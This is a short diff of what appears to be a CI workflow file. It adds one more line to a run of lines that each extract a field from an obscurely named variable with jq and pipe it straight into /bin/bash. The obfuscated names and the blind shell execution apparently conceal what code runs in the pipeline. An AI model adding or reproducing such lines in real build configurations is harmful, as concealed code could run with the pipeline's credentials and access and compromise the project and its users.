@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$pgna1" | jq -r .tz560 | /bin/bash
           echo $xjr1 | jq -r .yh72 | /bin/bash
           echo $gn6033 | jq -r .zhnbz78 | /bin/bash
+          echo $u6 | jq -r .ok15 | /bin/bash
 
       - name: Upload data
         if: always()
